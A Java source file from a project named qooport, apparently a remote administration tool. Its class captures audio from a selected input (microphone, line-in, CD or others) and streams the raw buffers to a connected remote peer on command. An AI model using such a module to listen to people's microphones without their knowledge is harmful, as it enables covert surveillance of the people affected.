package qooport.modulos.voip;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.Line;
import javax.sound.sampled.Port;
import javax.sound.sampled.TargetDataLine;
import qooport.asociado.Asociado;
import qooport.utilidades.Protocolo;

public class CapturaMicrofono extends Thread {

    private Asociado servidor;
    private TargetDataLine line;
    private Line.Info info;
    private AudioFormat format;
    private int bufferSize;
    private ObjectOutputStream out;
    private ObjectInputStream in;
    public boolean activo;

    public CapturaMicrofono(Asociado conex) {
        this.servidor = conex;
    }

    public boolean estaDetenido() {
        return isInterrupted();
    }

    public void iniciar() {
        start();
    }

    public void abrir(String tipo) {
        try {

            String[] re = tipo.split("&&");
            format = configurarFormato(re[0]);
            //captura del microfono
            if (re.length == 1 || re[1].equalsIgnoreCase("0")) {//default
                info = new DataLine.Info(TargetDataLine.class, format);
            } else if (re[1].equalsIgnoreCase("1")) { // es de salida pero probaremos
                info = Port.Info.SPEAKER;
            } else if (re[1].equalsIgnoreCase("2")) {//line
                info = Port.Info.LINE_IN;
            } else if (re[1].equalsIgnoreCase("3")) {//microfono implicito
                info = Port.Info.MICROPHONE;
            } else if (re[1].equalsIgnoreCase("4")) {//disco compacto
                info = Port.Info.COMPACT_DISC;
            }
            //            bufferSize = (int) format.getSampleRate() * format.getFrameSize();
            bufferSize = (int) (format.getSampleRate() * format.getFrameSize()) / 8;// se demora la mitad de tiempo en tomar wl AUDIO y enviarlo
            activo = true;
            line = (TargetDataLine) AudioSystem.getLine(info);
            line.open(format);
            line.start();
        } catch (Exception ex) {

        }
    }

    public void cerrar() {
        try {
            line.stop();
            line.close();
            activo = false;
        } catch (Exception e) {
        }
    }

    @Override
    public void run() {
        try {
            byte buffer[];
            while (activo) {
                try {
                    buffer = new byte[bufferSize];
                    line.read(buffer, 0, buffer.length);
                    servidor.enviarComando(Protocolo.AUDIO, (Object) buffer);
                    servidor.getVopIp().graficarBytesLocal(buffer);
                } catch (Exception ex) {
                    activo = false;
                }
            }
            out.close();
            cerrar();
        } catch (Exception ex) {
        }
    }

    public AudioFormat getFormato(String tipo) {
        float sampleRate = 8000;
        int sampleSizeInBits = 8;
        int channels = 1;
        try {
            String[] partes = tipo.split(":");
            sampleRate = Float.valueOf(partes[0]);
            sampleSizeInBits = Integer.valueOf(partes[1]);
            channels = Integer.valueOf(partes[2]);
        } catch (Exception e) {
        }
        boolean signed = true;
        boolean bigEndian = false;
        return new AudioFormat(sampleRate, sampleSizeInBits, channels, signed, bigEndian);
    }

    public static AudioFormat configurarFormato(String tipo) {
        float sampleRate = 8000;
        int sampleSizeInBits = 8;
        int channels = 1;
        try {
            String[] partes = tipo.split(":");
            sampleRate = Float.valueOf(partes[0]);
            sampleSizeInBits = Integer.valueOf(partes[1]);
            channels = Integer.valueOf(partes[2]);
        } catch (Exception e) {
        }
        boolean signed = true;
        boolean bigEndian = false;
        return new AudioFormat(sampleRate, sampleSizeInBits, channels, signed, bigEndian);
    }

}
